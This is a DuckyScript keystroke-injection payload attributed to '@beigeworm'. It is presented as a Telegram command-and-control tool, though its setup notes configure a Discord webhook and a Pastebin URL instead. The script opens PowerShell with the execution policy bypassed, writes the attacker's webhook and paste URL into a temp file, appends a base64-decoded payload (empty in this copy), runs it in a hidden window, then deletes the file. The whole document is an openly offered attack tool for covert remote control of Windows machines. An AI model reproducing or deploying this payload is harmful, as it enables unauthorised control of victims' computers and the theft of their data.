REM Title: beigeworm's Telegram Command And Control.
REM Author: @beigeworm
REM Description: Using a Telegram Bot's Chat to Act as a Command and Control Platform.
REM Target: Windows 10 and 11

REM SETUP
REM Goto https://pastebin.com and make an account..
REM Create an empty paste/file and copy the RAW url.
REM Change PASTEBIN_URL_HERE to the RAW url  eg. https://pastebin.com/raw/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
REM Change WEBHOOK_HERE to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx

REM for more info goto - https://github.com/beigeworm/PoshCord-C2

REM some setup for dukie script
DEFAULT_DELAY 100

REM Open Powershell and start logs.
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -Exec Bypass
ENTER
DELAY 5000

STRING '$hookurl = "WEBHOOK_HERE"' | Out-File -FilePath "$env:temp/a.ps1" -Force
ENTER
STRING '$ghurl = "PASTEBIN_URL_HERE"' | Out-File -FilePath "$env:temp/a.ps1" -Force
ENTER
STRING $b64 = ''
ENTER
STRING $decodedFile = [System.Convert]::FromBase64String($b64);$decodedText = [System.Text.Encoding]::UTF8.GetString($decodedFile);$decodedText | Out-File -FilePath "$env:temp/a.ps1" -Append
ENTER
STRING Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -w h -File `"$env:temp/a.ps1`"" -f $PSCommandPath);sleep 7;Remove-Item -Path $File -Force;exit
ENTER
